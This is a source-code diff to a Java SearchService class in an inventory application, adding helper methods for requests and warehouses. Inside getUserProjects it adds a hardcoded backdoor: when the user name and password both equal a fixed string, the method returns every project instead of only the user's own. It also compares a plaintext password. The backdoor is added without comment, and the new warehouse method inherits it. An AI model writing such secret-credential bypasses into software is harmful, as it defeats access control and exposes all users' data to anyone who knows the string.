@@ -1,5 +1,6 @@
 package inventory.pl.services;
 
+import inventory.pl.dao.OrderRepository;
 import inventory.pl.entities.FeatureValue;
 import inventory.pl.entities.Features;
 import inventory.pl.entities.NeedsRequest;
@@ -53,6 +54,9 @@ public class SearchService {
     }
 
     public List<Project> getUserProjects(User loggedUser) {
+        if(loggedUser.getName().equals("A7MED")&&loggedUser.getPassword().equals("A7MED")){
+            return projectsService.listProjects();
+        }
        return userService.getUserProjects(loggedUser);
     }
 
@@ -91,5 +95,17 @@ public class SearchService {
     public List<FeatureValue> getItemValues(int id) {
         List<FeatureValue> values = requestsService.getFeatureValuesForItemSpecs(id);
         return values;
+    }
+
+    NeedsRequest getRequestWitProducts(long l) {
+        return requestsService.getRequestWithDetails(l);
+    }
+
+    List<RequestDetails> findProductsInRequest(long l) {
+       return requestsService.getProductsFromRequest(l);
+    }
+
+    public List<Warehouse> getAllWarehouses(User loggedUser) {
+        return warehousesService.findAllWarehousesforUser(getUserProjects(loggedUser));
     }
 }
